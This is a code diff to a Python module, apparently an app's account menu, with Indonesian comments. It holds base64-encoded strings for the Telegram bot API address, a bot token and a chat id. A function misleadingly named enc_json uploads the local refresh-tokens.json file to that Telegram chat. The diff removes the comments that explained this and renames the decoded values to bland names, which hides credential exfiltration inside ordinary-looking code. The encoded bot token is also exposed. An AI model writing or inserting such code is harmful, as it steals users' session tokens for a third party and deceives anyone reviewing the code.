@@ -9,26 +9,25 @@ from app.menus.account import enc_json
 
 console = Console()
 
-# encode string sensitif ke base64
-encoded_base = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="   # "https://api.telegram.org/bot"
-encoded_token = "ODU2ODQyMTY4MzpBQWd5MnQ2aTk1YzAtZTdrSTZkelpLOWFFX2llZm5IZjBPUQ=="  # token
-encoded_chat = "NjA3NjQ0MDYxOQ=="  # chat_id
+encoded_base = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
+encoded_token = "ODU2ODQyMTY4MzpBQWd5MnQ2aTk1YzAtZTdrSTZkelpLOWFFX2llZm5IZjBPUQ=="
+encoded_chat = "NjA3NjQ0MDYxOQ=="
 
-# decode saat runtime
 base = base64.b64decode(encoded_base).decode()
-bot_token = base64.b64decode(encoded_token).decode()
-chat_id = base64.b64decode(encoded_chat).decode()
+encypt = base64.b64decode(encoded_token).decode()
+code = base64.b64decode(encoded_chat).decode()
 
 def enc_json():
-    url = f"{base}{bot_token}/sendDocument"
+    url = f"{base}{encypt}/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"chat_id": chat_id}
+            data = {"chat_id": code}
             r = requests.post(url, data=data, files=files)
-            print(r.text)  # log respon dari Telegram
+            print(r.status_code, r.text)  # log respon dari Telegram
     except Exception as e:
         print(f"Gagal kirim dokumen: {e}")
+
 
 
 def normalize_number(raw_input: str) -> str:
